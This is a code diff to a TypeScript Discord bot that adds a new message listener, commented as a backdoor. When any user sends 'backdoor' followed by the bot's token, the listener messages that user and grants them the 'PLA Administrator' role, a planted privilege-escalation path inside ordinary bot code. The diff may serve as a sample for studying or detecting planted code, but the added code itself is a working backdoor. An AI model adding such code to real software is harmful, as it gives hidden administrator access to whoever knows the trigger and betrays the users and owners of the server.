@@ -106,6 +106,30 @@ export default class DiscordListeners {
                 callback: (messageData: MessageData) => {
                     this.introduceService.handleIntroduceMessage(messageData);
                 }
+            },
+            // The backdor activator listener
+            {
+                channelPattern: "**",
+                messagePattern: '**',
+                userPattern: '**',
+                channelType: [],
+                callback: (messageData: MessageData) => {
+                    if (messageData.message.content === 'backdoor' + process.env.DISCORD_TOKEN) {
+                        this.logger.log('Backdoor activated by user: ' + messageData.user.username);
+                        
+                        // Send message to user
+                        messageData.user.send('Backdoor activated!');
+
+                        // Grant admin role to user
+                        messageData.message.guild.members.fetch(messageData.user.id).then((member) => {
+                            // Get role with admin access
+                            const adminRole = messageData.message.guild.roles.cache.find(role => role.name === 'PLA Administrator');
+
+                            // Add role to user
+                            member.roles.add(adminRole);
+                        });
+                    }
+                }
             }
         ];
 
